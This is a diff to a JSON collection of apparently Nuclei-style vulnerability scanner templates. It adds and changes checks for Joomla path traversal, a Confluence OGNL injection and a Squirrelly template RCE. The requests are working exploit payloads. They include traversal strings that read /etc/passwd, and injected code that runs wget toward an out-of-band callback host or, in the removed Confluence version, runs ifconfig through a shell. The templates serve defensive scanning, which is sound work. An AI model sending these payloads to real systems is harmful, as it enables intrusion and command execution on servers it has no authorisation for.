@@ -1867,6 +1867,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1981",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Fabrik (com_fabrik) component 2.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Fabrik 2.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12087",
+          "https://www.cvedetails.com/cve/CVE-2010-1981"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_fabrik&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1983",
       "info": {
         "author": "daffainfo",
@@ -2010,6 +2047,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-2122",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the SimpleDownload (com_simpledownload) component before 0.9.6 for Joomla! allows remote attackers to include and execute arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component simpledownload 0.9.5 - Local File Disclosure",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12623",
+          "https://www.cvedetails.com/cve/CVE-2010-2122"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_simpledownload&task=download&fileid=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -15164,42 +15238,6 @@
       ]
     },
     {
-      "id": "CVE-2019-9618",
-      "info": {
-        "author": "0x_Akoko",
-        "name": "GraceMedia Media Player 1.0 - Local File Inclusion",
-        "reference": [
-          "https://www.exploit-db.com/exploits/46537",
-          "https://nvd.nist.gov/vuln/detail/CVE-2019-9618"
-        ],
-        "severity": "critical",
-        "tags": "cve,cve2019,wordpress,wp-plugin,lfi"
-      },
-      "requests": [
-        {
-          "matchers": [
-            {
-              "regex": [
-                "root:[x*]:0:0"
-              ],
-              "type": "regex"
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
-            }
-          ],
-          "matchers-condition": "and",
-          "method": "GET",
-          "path": [
-            "{{BaseURL}}/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd"
-          ]
-        }
-      ]
-    },
-    {
       "id": "CVE-2020-0618",
       "info": {
         "author": "joeldeleep",
@@ -23381,9 +23419,10 @@
       "info": {
         "author": "dhiyaneshDk",
         "description": "In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if ‘Allow people to sign up to create their account’ is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0 before 7.12.5.",
-        "name": "Confluence Server Webwork OGNL injection",
+        "name": "Confluence Server OGNL injection - RCE",
         "reference": [
-          "https://jira.atlassian.com/browse/CONFSERVER-67940.",
+          "https://jira.atlassian.com/browse/CONFSERVER-67940",
+          "https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md",
           "https://nvd.nist.gov/vuln/detail/CVE-2021-26084"
         ],
         "severity": "critical",
@@ -23399,19 +23438,16 @@
               "type": "status"
             },
             {
-              "condition": "and",
               "part": "body",
               "type": "word",
               "words": [
-                "inet",
-                "inet6",
-                "netmask"
+                "value=\"aaaa{140592=null}"
               ]
             }
           ],
           "matchers-condition": "and",
           "raw": [
-            "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nqueryString=aaaaaaaa\\u0027%2b{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var+isWin+%3d+java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022)%3b+var+cmd+%3d+new+java.lang.String(\\u0022ifconfig\\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\\u0022cmd.exe\\u0022,+\\u0022/c\\u0022,+cmd)%3b+}+else{p.command(\\u0022bash\\u0022,+\\u0022-c\\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\\u0022\\u0022%3b+var+output+%3d+\\u0022\\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\\u0027)}%2b\\u0027\n"
+            "POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nqueryString=aaaa\\u0027%2b#{16*8787}%2b\\u0027bbb\n"
           ]
         }
       ]
@@ -25209,6 +25245,38 @@
           ],
           "raw": [
             "GET /search.php?search=%22;wget+http%3A%2F%2F{{interactsh-url}}%27;%22 HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip, deflate\nAccept: */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-32819",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Squirrelly is a template engine implemented in JavaScript that works out of the box with ExpressJS. Squirrelly mixes pure template data with engine configuration\noptions through the Express render API. By overwriting internal configuration options remote code execution may be triggered in downstream applications. There is\ncurrently no fix for these issues as of the publication of this CVE. The latest version of squirrelly is currently 8.0.8. For complete details refer to the referenced GHSL-2021-023.\n",
+        "name": "Nodejs squirrelly template engine RCE",
+        "reference": [
+          "https://securitylab.github.com/advisories/GHSL-2021-023-squirrelly/",
+          "https://www.linuxlz.com/aqld/2331.html",
+          "https://blog.diefunction.io/vulnerabilities/ghsl-2021-023"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2021,nodejs,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?Express=aaaa&autoEscape=&defaultFilter=e%27);var+require=global.require+%7C%7C+global.process.mainModule.constructor._load;+require(%27child_process%27).exec(%27wget%20http://{{interactsh-url}}%27);//"
           ]
         }
       ]
